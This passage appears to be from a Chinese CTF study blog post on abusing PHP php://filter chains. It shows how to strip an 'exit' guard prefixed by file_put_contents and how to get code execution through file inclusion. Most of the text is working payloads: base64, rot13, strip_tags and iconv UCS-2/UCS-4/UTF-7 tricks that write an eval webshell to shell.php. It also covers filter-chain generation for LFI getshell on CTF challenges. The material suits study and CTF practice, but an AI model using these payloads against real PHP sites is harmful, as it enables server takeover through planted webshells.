-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
-
-<p><code>$content</code>在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上if(!defined(xxx))exit;之类的限制）。</p>
-<p>但是注意，<code>file_put_content()</code>函数是可以使用php:&#x2F;&#x2F;filter，同时这里的<code>$_POST[&#39;filename&#39;]</code>是可以被控制为传入的参数为伪协议的，那么我们就可以在这里尝试做文章。</p>
-<p>思路：只要将<code>content</code>前面部分的那段代码使用某种手段（编码等）进行处理，导致<code>php</code>不能识别该部分就行，这里的<code>$_POST[&#39;filename&#39;]</code>是可以控制协议的。</p>
-<h4 id="利用base64编码"><a href="#利用base64编码" class="headerlink" title="利用base64编码"></a>利用base64编码</h4><p>使用<code>php://filter</code>流的base64-decode方法，将<code>$content</code>解码，利用php base64_decode函数特性去除“死亡exit”。</p>
-<p><strong>核心原理</strong>：Base64编码中只包含64个可打印字符，而PHP在解码Base64时，遇到不在其中的字符时，将会跳过这些字符，键将合法字符组成一个进的字符串进行解码。</p>
-<p>所以，一个正常的<code>base64_decode</code>实际上可以理解为如下两个步骤。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>] = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br></pre></td></tr></table></figure>
-
-<p>所以，当<code>$content</code>被加上了<code>&lt;?php  exit; ?&gt;</code>以后，当使用<code>php://filter/write=convert.base64-decode</code>对其解码，<strong>在解码的过程中，字符<code>&lt;</code>、<code>?</code>、<code>;</code>、<code>&gt;</code>、<code>空格</code>等字符会因为不符合base64编码的字符范围被忽略，所以最终被解码的字符仅有<code>phpexit</code>和我们传入的其他字符。</strong></p>
-<p><code>phpexit</code>一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加一个”a”一共8个字符。这样，<code>phpexita</code>被正常解码，而后面我们传入的webshell的base64内容页被正常解码，结果就是<code>&lt;?php exit;?&gt;</code>没有了。</p>
-<p><strong>最后效果</strong></p>
-<p>成功写入：</p>
-<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521191114493.png" alt="image-20240521191114493"></p>
-<p>成功执行：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521191420996.png" alt="image-20240521191420996"></p>
-<h4 id="利用rot13编码"><a href="#利用rot13编码" class="headerlink" title="利用rot13编码"></a>利用rot13编码</h4><p><strong>条件</strong>：<code>short_open_tag = off</code>,即不开启短标签（也许默认为On，自己的配置就是）</p>
-<p>原理和上面类似，核心是将“死亡exit”去除，<code>&lt;?php exit; ?&gt;</code>在经过rot13编码后会变成<code>&lt;?cuc rkvg; ?&gt;</code>，在不开启<code>short_open_tag</code>时，php不认识这个字符串，当然也就不会执行。</p>
-<p><strong>最后效果</strong></p>
-<p>成功写入：</p>
-<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521194945000.png" alt="image-20240521194945000"></p>
-<p>成功执行：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521195044746.png" alt="image-20240521195044746"></p>
-<p><strong>同时经测试，将条件改为On，不能执行。</strong></p>
-<h4 id="利用字符串操作方法"><a href="#利用字符串操作方法" class="headerlink" title="利用字符串操作方法"></a>利用字符串操作方法</h4><p>这里就需要用到上面阐述过的<code>string.strip_tags</code>，在测试代码中：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
-
-<p>可以看到<code>&lt;?php exit; ?&gt;</code>实际上是一个XML标签，既然是XML标签，就可以利用<code>strip_tags</code>函数去除它，而<code>php://filter</code>是支持这个方法的，</p>
-<p>已经阐述过<code>string.strip_tags</code>过滤器会过滤的东西，那么我们可以直接尝试这样构造</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=string.strip_tags|convert.base64-decode/resource=12.txt&amp;txt=PD9waHAgcGhwaW5mbygpOyA/Pg==</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#为了防止想传入的数据也被去除掉，所以这里也将内容编码一下</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>最后效果</strong></p>
-<p>成功写入：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521201629726.png" alt="image-20240521201629726"></p>
-<p>成功执行：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521201701528.png" alt="image-20240521201701528"></p>
-<p><strong>这个方法的做题记录：</strong><br>写入：</p>
-<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521202558001.png" alt="image-20240521202558001"></p>
-<p>利用：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521202621401.png" alt="image-20240521202621401"></p>
-<h4 id="代码变形bypass"><a href="#代码变形bypass" class="headerlink" title="代码变形bypass"></a>代码变形bypass</h4><p>对于这个板块的代码可利用的有三种，总结一下(注意融汇贯通，比如下面的<code>convert.iconv*</code>也许也能用于起亚抢矿，注重思考)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一种情况，就是上面说的那种：</span><br><span class="line">file_put_contents($_POST[&#x27;filename&#x27;],&quot;&lt;?php exit();&quot;.$_POST[&#x27;content&#x27;]); </span><br><span class="line"></span><br><span class="line">第二种：相同变量</span><br><span class="line">$content = $GET[&#x27;content&#x27;];</span><br><span class="line">file_put_contents($content,&#x27;&lt;?php exit;&#x27;.$content);</span><br><span class="line"></span><br><span class="line">第三种</span><br></pre></td></tr></table></figure>
-
-<p>第一种情况已经在上面已经有比较清楚的说明，先在来说说第二种情况。</p>
-<h5 id="bypass相同变量"><a href="#bypass相同变量" class="headerlink" title="bypass相同变量"></a>bypass相同变量</h5><p>这里对应第二种情况，bypass的方法如下</p>
-<h6 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h6><p><strong>首先有个知识点：</strong><code>=</code>在base64中的作用是填充，也就是意味着结束；在<code>=</code>的后面是不允许有其他任何字符的，否则会报错，并且这样会导致无法正常写入文件的。测试一下：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://filter/convert.base64-decode/resource=2.txt&#x27;</span>,<span class="string">&#x27;PD9waHAgcGhwaW5mbygpOz8+=.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
-<p>运行过后没有写入文件，2.txt文件为空。再改一下代码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://filter/convert.base64-decode/resource=2.txt&#x27;</span>,<span class="string">&#x27;PD9waHAgcGhwaW5mbygpOz8+.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
-<p>成功向2.txt文件写入东西</p>
-<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522131121762.png" alt="image-20240522131121762"></p>
-<p>确实存在这个问题，<strong>需要注意</strong></p>
-<p>——————</p>
-<p>常规可想到的payload</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php</span></span><br></pre></td></tr></table></figure>
-
-<p><code>content</code>拼接过后的内容为：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">exit</span>();php:<span class="comment">//filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php</span></span><br></pre></td></tr></table></figure>
-
-<p>此时就有一个问题<strong>，<code>=</code>的问题</strong>，需要使用一个方法将其去掉这里考虑<code>string.strip_tags</code>过滤器，如下构造：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2b</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#注意，这里需要将&#x27;+&#x27;URL编码为%2B,防止被浏览器当做空格处理</span></span><br></pre></td></tr></table></figure>
-
-<p>此时拼接后的语句可以**配合到php前后对应的标签被去除只剩下<code>PD9waHAgcGhwaW5mbygpOz8+.php</code>**，再被base64解码形成想要执行的字符串并填入到文件中，如下测试代码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://filter/string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B.php&#x27;</span>,<span class="string">&#x27;&lt;?php exit;php://filter/string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
-<p>成功执行（生成了一个文件，文件名为<code>?&gt;PD9waHAgcGhwaW5mbygpOz8%2b.php</code>，但是没有内容），估计是系统问题</p>
-<p>但是由于文件名不正常，想读就必须加上引号，但是在浏览器访问的时候访问不到看（引号问题），不好读，这里可以尝试将其改变为一个正常的文件名，这里采用<strong>伪目录的方法</strong>（这里将<code>resource</code>后面前面的base64字符和闭合的符号整体看做一个目录，但是由于没有这个目录，于是就撤回到了原目录，可以生成我们能够访问的文件名），于是构建如下payload:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../haha.php</span></span><br></pre></td></tr></table></figure>
-
-<p>这样可以构建出haha.php，文件，内容为<code>&lt;?php phpinfo();?&gt;</code>，原理我是get到了，但是本地搭没测试出来，怪，等有题的时候再试试。</p>
-<h6 id="rot13绕过"><a href="#rot13绕过" class="headerlink" title="rot13绕过"></a>rot13绕过</h6><p>首先rot13编码不受限于<code>=</code>,并且条件同样为之前那个（<code>short_open_tag = off</code>），这样才不会被PHP识别为代码。</p>
-<p>payload：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">content=php:<span class="comment">//filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=shell.php</span></span><br><span class="line"></span><br><span class="line">content=php:<span class="comment">//filter/write=string.rot13/resource=&lt;?cuc cucvasb();?&gt;/../shell.php</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>对于第一个payload个人理解（重要，后面对于这种构造方法利用的比较多）</strong>：第一个payload将我们想要利用的字符串放进了了过滤器列表里面，个人猜测是php程序在运行这串代码时会找有没有这个过滤器，没有就直接跳过舍弃。</p>
-<p>测试一下：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">测试代码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$content</span>,<span class="string">&#x27;&lt;?php exit;&#x27;</span>.<span class="variable">$content</span>);</span><br><span class="line">传入的payload:</span><br><span class="line">php:<span class="comment">//filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=erqie.php</span></span><br><span class="line"> 拼接完后即是：</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">exit</span>;php:<span class="comment">//filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=erqie.php</span></span><br></pre></td></tr></table></figure>
-
-<p>最终结果：<br>成功写入：</p>
-<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522194848128.png" alt="image-20240522194848128"></p>
-<p>成功执行：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522194907522.png" alt="image-20240522194907522"></p>
-<h6 id="convert-iconv-1"><a href="#convert-iconv-1" class="headerlink" title="convert.iconv.*"></a>convert.iconv.*</h6><p>对于<code>iconv</code>字符编码转换进行绕过的手法，类似于上面所述的<code>rot13</code>方法，都是先对原有字符串进行某种编码然后再解码，这个过程导致最初的限制<code>exit;</code>去除，而我们的恶意代码正常解码存储。（注意：不出意外的话应该是只有类似”同族“的编码方式才能这样转换）</p>
-<ul>
-<li><strong>usc-2</strong></li>
-</ul>
-<p>通过UCS-2方式，对目标字符串进行2位一反转（这里的2LE和2BE可以看作是小端和大端的列子），<strong>也就是说构造的恶意代码的字节数需要是UCS-2中2的倍数</strong>，不然不能进行正常反转</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>,<span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>);</span><br><span class="line"><span class="comment"># ?&lt;hp phpipfn(o;)&gt;? 从转换结果就可以看出来是如何转换的，为什么要是2的倍数 同时注意包裹要转换的字符串必须是单引号</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[x]); <span class="meta">?&gt;</span> <span class="comment">#一句话木马</span></span><br><span class="line"><span class="comment">#?&lt;hp pe@av(l_$OPTSx[)] ;&gt;?</span></span><br></pre></td></tr></table></figure>
-
-<p>payload(其实都差不多了感觉):</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSx[)] ;&gt;?/resource=shell.php</span><br></pre></td></tr></table></figure>
-
-<p>最后效果：</p>
-<p>成功写入：</p>
-<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522201457636.png" alt="image-20240522201457636"></p>
-<p>成功利用：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522201556443.png" alt="image-20240522201556443"></p>
-<ul>
-<li><strong>usc-4</strong></li>
-</ul>
-<p>这个和上面那个差不多的，只不过这个是对目标字符串进行4位以反转(这里的4LE和4BE可以看作是小端和大端的列子），也就是说目标字符串的字节需要为4的倍数，简单说说：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-4LE&quot;</span>,<span class="string">&quot;UCS-4BE&quot;</span>,<span class="string">&#x27;&lt;?php @eval($_POST[x12]); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="comment">#hp?&lt;e@ p(lavOP_$x[TS)]21&gt;? ;</span></span><br></pre></td></tr></table></figure>
-
-<p>payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/write=convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@ p(lavOP_$x[TS)]21&gt;? ;/resource=shell.php</span><br></pre></td></tr></table></figure>
-
-<p>最终效果：</p>
-<p>写入：</p>
-<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522202744151.png" alt="image-20240522202744151"></p>
-<p>利用：</p>
-<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522202830720.png" alt="image-20240522202830720"></p>
-<ul>
-<li>utf8-utf7</li>
-</ul>
-<p>这个方法就与上面两个不同了，由于utf-8与utf-7在编码转换时只对符号进行编码，不对字符编码。如下：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;utf-8&quot;</span>,<span class="string">&quot;utf-7&quot;</span>,<span class="string">&#x27;&lt;?php @eval($_POST[x12]); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="comment">#+ADw?php +AEA-eval(+ACQAXw-POST+AFs-x12+AF0)+ADs ?+AD4-   可以看出字符都被留下来了，并且在像上面方法那样利用转换并不能成功，可以自己试试</span></span><br></pre></td></tr></table></figure>
-
-<p>但是注意这个：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;utf-8&quot;</span>,<span class="string">&quot;utf-7&quot;</span>,<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line"><span class="comment">#+AD0- 并且刚好是四个字节，可以被base64解码掉</span></span><br></pre></td></tr></table></figure>
-
-<p>这个编码把<code>=</code>给过滤了，这时候就可以想到结合上面将的Base64编码使用，</p>
-<p>这是就要注意到之间说过的4个为一个单位来将前面的<code>phpexit</code>去掉，但是这里不一样，需要将传入的字符前面所有都为四个字节为一组，先看简单构造出来的payload:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/write=XXXPD9waHAgQGV2YWwoJF9QT1NUWyd4J10pOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=shell.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#PD9waHAgQGV2YWwoJF9QT1NUWyd4J10pOz8+  ： &lt;?php @eval($_POST[&#x27;x&#x27;]);?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>此时我们就需要想如何使得前面的能够为4个一组，操作点就在<code>XXX</code>那里，写一个php代码看看前面的在过滤后还剩什么：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$c</span>=<span class="string">&#x27;&lt;?php exit;php://filter/write=&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">iconv</span>(<span class="string">&quot;utf-8&quot;</span>,<span class="string">&quot;utf-7&quot;</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>.PHP_EOL;</span><br><span class="line"><span class="variable">$ga</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ga</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">+ADw?php <span class="keyword">exit</span>+ADs-php:<span class="comment">//filter/write+AD0-</span></span><br><span class="line"></span><br><span class="line">+ADwphpexit+ADsphp<span class="comment">//filter/write+AD0</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#第二个字符串就是我们最终会被base64解码的字符串，这里刚好有36个字节，所以不用往前面加东西-即不用加X</span></span><br></pre></td></tr></table></figure>
-
-<p>最终payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/write=PD9waHAgQGV2YWwoJF9QT1NUWyd4J10pOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=shell.php</span><br></pre></td></tr></table></figure>
-
-<p>成功写入：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522212950464.png" alt="image-20240522212950464"></p>
-<p>利用：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522213035987.png" alt="image-20240522213035987"></p>
-<p>参考文章：</p>
-<p><code>https://www.leavesongs.com/PENETRATION/php-filter-magic.html</code></p>
-<p><code>https://xz.aliyun.com/t/8163?time__1311=n4%2BxuDgDBDyGKAKD%3DD7Dl1oQST4j2DiKErYx&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-6</code></p>
-<p><code>https://blog.csdn.net/woshilnp/article/details/117266628</code></p>
-<h3 id="利用filter-chain生成任意字符"><a href="#利用filter-chain生成任意字符" class="headerlink" title="利用filter chain生成任意字符"></a>利用filter chain生成任意字符</h3><p>所以这里就利用了filter链的构造，详细看这个项目：</p>
-<p><a href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</a></p>
-<p>当然也有可以直接用来梭的脚本：</p>
-<p><a href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></p>
-<h5 id="php-temp"><a href="#php-temp" class="headerlink" title="php:&#x2F;&#x2F;temp"></a>php:&#x2F;&#x2F;temp</h5><p>这里说明一个知识点，temp和memory伪协议</p>
-<p><code>php://memory</code>和<code>php://temp</code>是一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是<code>php://memory</code>总是把数据储存在内存中，而<code>php://temp</code>的内存限制可通过田间<code>/maxmemory:NN</code>来控制，NN是以字节为单位、保留在内存的最大数据量，超过则使用临时文件</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$fiveMBs</span> = <span class="number">5</span> * <span class="number">1024</span> * <span class="number">1024</span>;  </span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;php://temp/maxmemory:<span class="subst">$fiveMBs</span>&quot;</span>, <span class="string">&#x27;r+&#x27;</span>);  </span><br><span class="line"><span class="title function_ invoke__">fputs</span>(<span class="variable">$fp</span>, <span class="string">&quot;hello\n&quot;</span>);  </span><br><span class="line"><span class="comment">// 读取写入的数据.  </span></span><br><span class="line"><span class="title function_ invoke__">rewind</span>(<span class="variable">$fp</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$fp</span>);</span><br></pre></td></tr></table></figure>
-
-<p><code>php://memory</code>和<code>php://temp</code>是一次性的，比如：当stream流关闭后，就无法再次得到以前的内容了</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://memory&#x27;</span>, <span class="string">&#x27;PHP&#x27;</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://memory&#x27;</span>); <span class="comment">// 啥也没有</span></span><br></pre></td></tr></table></figure>
-
-<h5 id="如何构造"><a href="#如何构造" class="headerlink" title="如何构造"></a>如何构造</h5><p>由于PHP Filter的存在，我们可以利用一些操作来构造自己想要的内容。正好PHP Filter当中有一种<code>convert.iconv</code>的Filter，可以用来将数据从字符集A转换为字符集B。</p>
-<p>举个简单的例子：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&quot;php://filter/convert.iconv.UTF-8/UTF-7/resource=data://,some&lt;&gt;text&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$content</span>);</span><br><span class="line"><span class="comment">// some+ADwAPg-text 同时这里的data:,其实就是data伪协议，只是这里没有指定媒体类型，默认为text/plain;charset=US-ASCII，故只有后面的some&lt;&gt;text被转换了。</span></span><br></pre></td></tr></table></figure>
-
-<p>那么如何利用呢？</p>
-<p><strong>这里先说明一个技巧：</strong>当我们使用其他字符编码产生了不可见字符，并且对于PHP Base来说是非法字符（比如：$)C），那么此时我们只需要base64-decoded一下就可以去掉不可见字符了，但是与此同时，我们的C字符也也被 base64-decode解码了，这时候需要再把解码结果使用一次base64-encode即可还原回来原来的C字符，这样就可以留下我们想要的字符了。</p>
-<p>比如我们现在想要构造尖括号，因为base64编码合法字符里没有尖括号，所以不能直接产生PHP代码进行包含，但是可以通过上面的那个技巧来产生一个Base64字符串，最后再使用一次base64解码就可以产生了</p>
-<p>比如我们可以通过生成<code>PAaaaaa</code>，最后再经过Base64解码得到的字符为<code>&lt;</code>，后续为其他不需要的垃圾字符串。所以接下来需要做的，就是利用上面的技巧找到这么一类编码，可以只存在我们需要构造的一个webshell的base64字符串了。</p>
-<p>大概就是这个意思，直接看题，具体构造直接看下面的参考文章。</p>
-<h5 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h5><p>下面都是直接利用的这个项目：<code>https://github.com/synacktiv/php_filter_chain_generator</code></p>
-<h6 id="用于文件包含"><a href="#用于文件包含" class="headerlink" title="用于文件包含"></a>用于文件包含</h6><p><strong>通过叠加过滤器能够在allow_url_fopen和allow_url_include双Off的情况下直接通过php:&#x2F;&#x2F;filter进行文件包含getshell</strong>，比如XYCTF的题</p>
-<p><strong>ezLFI</strong></p>
-<p>题目描述：一句话木马？<br>——————</p>
-<p>有附件，可以知道index.php的内容为<code>&lt;?php include_once($_REQUEST[&#39;file&#39;]);</code>，waf了很多，这里可以通过叠加过滤器能够在allow_url_fopen和allow_url_include双Off的情况下直接通过php:&#x2F;&#x2F;filter进行文件包含getshell</p>
-<p>项目地址：<code>https://github.com/synacktiv/php_filter_chain_generator</code>，直接利用这个脚本生成</p>
-<p>如下：</p>
-<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527152334913.png" alt="image-20240527152334913"></p>
-<p>成功得到flag</p>
-<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527152405691.png" alt="image-20240527152405691"></p>
-<p><strong>这里可以利用的原因</strong>就在于<code>php://temp</code>，经过一系列过滤器处理后的数据被传递给了<code>php://temp</code>流，这意味着最终的数据被写入了一个临时文件中。这个临时文件中包含了经过处理的数据，由此可以用于文件包含。</p>
-<h6 id="用于构造任意字符串"><a href="#用于构造任意字符串" class="headerlink" title="用于构造任意字符串"></a>用于构造任意字符串</h6><p>其实本质和上面那个差不多，这里记录一下做法而已，对于为什么会在前面构造出想要的字符串，看参考文章。</p>
-<p><strong>连连看到底是连连什么看</strong></p>
-<p>题目描述：到底连连什么看才对呢？（flag在根目录&#x2F;flag下）</p>
